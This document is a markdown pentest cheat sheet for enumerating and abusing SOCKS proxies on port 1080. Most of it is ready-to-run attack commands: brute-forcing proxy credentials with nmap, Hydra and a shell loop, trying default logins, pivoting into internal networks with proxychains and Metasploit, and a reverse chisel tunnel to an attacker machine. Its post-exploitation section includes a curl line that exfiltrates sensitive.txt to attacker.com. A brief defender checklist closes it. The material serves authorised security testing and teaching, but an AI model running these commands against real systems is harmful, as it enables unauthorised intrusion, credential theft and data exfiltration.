# SOCKS PROXY ENUMERATION (Port 1080)

## SERVICE OVERVIEW
```
SOCKS (Socket Secure) is a protocol for proxy servers
- SOCKS4: IPv4 only, no authentication
- SOCKS5: IPv4/IPv6, supports authentication, UDP
- Common port: 1080 (but can be any port)
- Used for tunneling traffic through a proxy
- Can proxy any TCP/UDP traffic (not just HTTP)
```

## BANNER GRABBING & VERSION DETECTION
```bash
nmap -sV -p1080 <IP>                             # Service/Version detection
nc -nv <IP> 1080                                 # Manual connection
telnet <IP> 1080                                 # Alternative connection
```

## SOCKS PROXY DETECTION
```bash
# Nmap scripts
nmap -p1080 --script socks-open-proxy <IP>       # Detect open SOCKS proxy
nmap -p1080 --script socks-auth-info <IP>        # Get auth info
nmap -p1080 --script socks-brute <IP>            # Brute force auth

# Check if it's an open proxy
curl -x socks5://<IP>:1080 http://www.google.com
curl -x socks4://<IP>:1080 http://www.google.com
```

## TEST SOCKS PROXY (No Authentication)
```bash
# Test with cURL
curl -x socks5://<IP>:1080 http://ipinfo.io      # SOCKS5
curl -x socks4://<IP>:1080 http://ipinfo.io      # SOCKS4
curl --socks5 <IP>:1080 http://www.google.com    # Alternative syntax

# Test HTTPS
curl -x socks5://<IP>:1080 https://www.google.com

# Test with specific protocol version
curl --socks4 <IP>:1080 http://example.com
curl --socks5 <IP>:1080 http://example.com
curl --socks5-hostname <IP>:1080 http://example.com  # DNS via proxy
```

## TEST SOCKS PROXY (With Authentication)
```bash
# SOCKS5 with username/password
curl -x socks5://user:password@<IP>:1080 http://www.google.com
curl --socks5 <IP>:1080 --proxy-user user:password http://www.google.com

# Test default credentials
curl -x socks5://admin:admin@<IP>:1080 http://www.google.com
curl -x socks5://proxy:proxy@<IP>:1080 http://www.google.com
```

## PROXYCHAINS CONFIGURATION
```bash
# Edit /etc/proxychains.conf or /etc/proxychains4.conf
# Add at the end:
socks5 <IP> 1080
# Or for SOCKS4:
socks4 <IP> 1080

# With authentication:
socks5 <IP> 1080 username password

# Use proxychains
proxychains curl http://www.google.com
proxychains nmap -sT -Pn <target>                # Scan through proxy
proxychains firefox                              # Browse through proxy
proxychains ssh user@<target>                    # SSH through proxy
```

## NMAP THROUGH SOCKS PROXY
```bash
# Using proxychains
proxychains nmap -sT -Pn <target>                # TCP scan only (no SYN through SOCKS)
proxychains nmap -sT -Pn -p 22,80,443 <target>

# Note: SOCKS proxies only support TCP connect scans (-sT)
# SYN scans (-sS) won't work through SOCKS
```

## METASPLOIT THROUGH SOCKS PROXY
```bash
# In msfconsole
setg Proxies socks5:<IP>:1080                    # Set global proxy
# Or with auth:
setg Proxies socks5:user:password@<IP>:1080

# Use modules through proxy
use auxiliary/scanner/portscan/tcp
set RHOSTS <target>
run

# Remove proxy
unsetg Proxies
```

## BRUTE FORCE AUTHENTICATION
```bash
# Nmap brute force
nmap -p1080 --script socks-brute --script-args userdb=users.txt,passdb=passwords.txt <IP>

# Hydra (if supported)
hydra -L users.txt -P passwords.txt <IP> socks5

# Manual testing
for user in admin proxy user; do
    for pass in admin password proxy 123456; do
        echo "Testing $user:$pass"
        curl -x socks5://$user:$pass@<IP>:1080 http://www.google.com -m 5 2>&1 | grep -q "200 OK" && echo "[+] Valid: $user:$pass"
    done
done
```

## DEFAULT CREDENTIALS
```bash
# Common SOCKS proxy credentials
admin:admin
proxy:proxy
user:user
socks:socks
guest:guest

# Test defaults
curl -x socks5://admin:admin@<IP>:1080 http://ipinfo.io
curl -x socks5://proxy:proxy@<IP>:1080 http://ipinfo.io
```

## PIVOTING THROUGH SOCKS PROXY
```bash
# Scan internal network through SOCKS proxy
proxychains nmap -sT -Pn 192.168.1.0/24

# Access internal web servers
proxychains curl http://internal.server.local
curl -x socks5://<IP>:1080 http://192.168.1.100

# SSH to internal systems
proxychains ssh user@192.168.1.50
ssh -o "ProxyCommand=nc -X 5 -x <IP>:1080 %h %p" user@192.168.1.50

# RDP through proxy (using proxychains)
proxychains rdesktop 192.168.1.100
proxychains xfreerdp /v:192.168.1.100
```

## SSH DYNAMIC PORT FORWARDING (Create SOCKS Proxy)
```bash
# Create your own SOCKS proxy via SSH
ssh -D 1080 user@<IP>                            # Listen on localhost:1080
ssh -D 0.0.0.0:1080 user@<IP>                    # Listen on all interfaces

# Then use it:
curl -x socks5://127.0.0.1:1080 http://target.internal
proxychains nmap -sT target.internal

# Add to proxychains.conf:
socks5 127.0.0.1 1080
```

## CHISEL (HTTP Tunneling with SOCKS)
```bash
# On attacker machine (server)
./chisel server -p 8000 --reverse

# On target machine (client)
./chisel client <attacker_IP>:8000 R:1080:socks

# Now you have SOCKS proxy on attacker's port 1080
proxychains nmap -sT internal.target
```

## SOCKS PROXY FINGERPRINTING
```bash
# Determine SOCKS version
nmap -p1080 --script socks-auth-info <IP>

# Test SOCKS4
curl --socks4 <IP>:1080 http://www.google.com

# Test SOCKS5
curl --socks5 <IP>:1080 http://www.google.com

# SOCKS5 supports:
# - IPv6
# - UDP
# - Authentication
# - DNS resolution via proxy

# SOCKS4 supports:
# - IPv4 only
# - TCP only
# - No authentication
# - No DNS via proxy
```

## VULNERABILITY SCANNING
```bash
# Check for open proxy
nmap -p1080 --script socks-open-proxy <IP>

# Known vulnerabilities
searchsploit socks
searchsploit "socks proxy"

# Common SOCKS server software vulnerabilities
searchsploit dante                               # Dante SOCKS server
searchsploit "3proxy"                            # 3proxy
```

## METASPLOIT MODULES
```bash
msfconsole
use auxiliary/scanner/socks/socks_version        # Version detection
use auxiliary/scanner/socks/socks_unc_path       # UNC path injection
use auxiliary/scanner/socks/socks_relay          # SOCKS relay check
set RHOSTS <IP>
set RPORT 1080
run
```

## TRAFFIC ANALYSIS
```bash
# Capture SOCKS traffic
tcpdump -i eth0 'tcp port 1080' -w socks.pcap
wireshark (filter: tcp.port == 1080)

# SOCKS5 authentication (if used) may reveal credentials
# Commands and destinations are visible in traffic
```

## BYPASS RESTRICTIONS
```bash
# If target blocks certain IPs, use SOCKS proxy to appear from proxy's IP
curl -x socks5://<IP>:1080 http://restricted-site.com

# Access internal resources not accessible externally
curl -x socks5://<IP>:1080 http://192.168.1.100/admin

# Bypass firewall rules
proxychains nmap -sT internal.target
```

## COMMON MISCONFIGURATIONS
```
☐ Open SOCKS proxy (no authentication)          # Anyone can use it
☐ Weak authentication                            # Default credentials
☐ No IP restrictions                             # Accessible from anywhere
☐ No rate limiting                               # Abuse/DoS possible
☐ Allows access to internal networks             # Pivot point
☐ No logging                                     # Abuse goes unnoticed
☐ Exposed on public internet                     # Easy to find and abuse
☐ Allows UDP (SOCKS5)                           # Can be used for DDoS amplification
```

## QUICK WIN CHECKLIST
```
☐ Test if proxy is open (no auth required)
☐ Test default credentials
☐ Determine SOCKS version (4 or 5)
☐ Test access to internal networks
☐ Check for authentication requirement
☐ Test UDP support (SOCKS5)
☐ Brute force authentication if enabled
☐ Use for pivoting to internal systems
☐ Check for known vulnerabilities
☐ Test if DNS resolution works through proxy
```

## ONE-LINER FULL ENUMERATION
```bash
# Quick SOCKS proxy check
nmap -sV -p1080 --script "socks-*" <IP>

# Test open proxy
curl -x socks5://<IP>:1080 http://ipinfo.io -m 10

# Test internal network access
curl -x socks5://<IP>:1080 http://192.168.1.1 -m 5
```

## POST-EXPLOITATION (After finding open SOCKS proxy)
```bash
# Scan internal network
proxychains nmap -sT -Pn 192.168.0.0/24
proxychains nmap -sT -Pn -p 22,80,443,445,3389 10.0.0.0/24

# Access internal web applications
proxychains firefox &
# Navigate to http://internal.app

# Access internal services
proxychains ssh user@internal.server
proxychains mssql-cli -S internal.db.server -U sa

# Exfiltrate data
curl -x socks5://<IP>:1080 --upload-file sensitive.txt http://attacker.com/upload

# Use as pivot for entire penetration test
# All traffic routed through compromised SOCKS proxy
```

## DETECTION & LOGGING
```bash
# Attackers use SOCKS proxies to:
# - Hide their source IP
# - Access internal networks
# - Bypass geo-restrictions
# - Evade detection

# Defenders should:
# - Require authentication on all SOCKS proxies
# - Restrict by source IP
# - Monitor and log all connections
# - Disable if not needed
# - Use network segmentation
```

## ALTERNATIVES TO SOCKS
```
HTTP Proxy:  Application-layer, HTTP/HTTPS only
SOCKS4:      Transport-layer, TCP only, no auth
SOCKS5:      Transport-layer, TCP/UDP, with auth
SSH Tunnel:  Encrypted, can create SOCKS proxy
VPN:         Full network layer encryption
```
